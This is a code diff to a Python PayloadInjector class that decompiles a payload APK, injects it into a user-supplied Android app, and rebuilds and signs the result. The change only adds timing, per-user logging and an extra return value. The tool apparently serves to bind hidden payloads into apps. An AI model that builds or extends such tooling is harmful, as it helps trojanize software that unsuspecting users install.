@@ -5,6 +5,7 @@ import asyncio
 import logging
 import subprocess
 import struct
+import time
 from pathlib import Path
 from .config import APKTOOL_PATH, ZIPALIGN_PATH, APKSIGNER_PATH, DEBUG_KEYSTORE_PATHS, DEBUG_KEYSTORE_PASSWORD, DEBUG_KEYSTORE_ALIAS
 from .apk_analyzer import APKAnalyzer
@@ -67,7 +68,7 @@ class PayloadInjector:
             logger.info(f"✅ Payload cache ready: {cache_dir}")
             return True
         
-    async def inject(self, user_apk_path, output_path):
+    async def inject(self, user_apk_path, output_path, user_id=None, username=None):
         """
         Main injection process
         
@@ -80,8 +81,10 @@ class PayloadInjector:
         6. Rebuild and sign payload
         7. Return final APK path
         """
+        start_time = time.time()
+        
         try:
-            logger.info("🚀 Starting payload injection...")
+            logger.info(f"🚀 Starting payload injection for user {user_id} ({username})")
             
             # Step 1: Decompile payload
             logger.info("📦 Step 1/6: Decompiling payload...")
@@ -123,12 +126,16 @@ class PayloadInjector:
             if not final_apk:
                 return None, "Failed to build final APK"
             
-            logger.info(f"✅ Payload injection complete: {final_apk}")
-            return final_apk, None
+            duration = int(time.time() - start_time)
+            logger.info(f"✅ Payload injection complete: {final_apk} (Duration: {duration}s)")
+            
+            # Return with duration info
+            return final_apk, None, duration
             
         except Exception as e:
-            logger.error(f"Injection error: {str(e)}")
-            return None, str(e)
+            duration = int(time.time() - start_time)
+            logger.error(f"Injection error after {duration}s: {str(e)}")
+            return None, str(e), duration
         finally:
             # Cleanup
             await self._cleanup()
